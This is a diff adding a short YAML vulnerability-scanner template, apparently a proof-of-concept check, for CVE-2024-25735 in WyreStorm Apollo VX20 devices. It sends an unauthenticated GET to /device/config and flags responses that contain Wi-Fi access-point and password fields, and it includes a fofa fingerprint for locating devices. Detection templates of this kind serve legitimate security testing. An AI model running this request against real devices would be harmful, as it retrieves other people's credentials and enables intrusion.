@@ -1,0 +1,25 @@
+id: poc-yaml-wyrestorm-apollo-vx20-information-disclosure
+info:
+  name: WyreStorm Apollo VX20 信息泄露漏洞(CVE-2024-25735)
+  severity: high
+  tags:
+  - CVE-2024-25735
+  - 信息泄露
+  finger: Apollo VX20
+  fofa: WyreStorm Apollo VX20
+requests:
+- method: GET
+  path: /device/config
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"softAp\"") &&
+
+    contains(body,"\"password\"") &&
+
+    contains(headers,"application/json") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
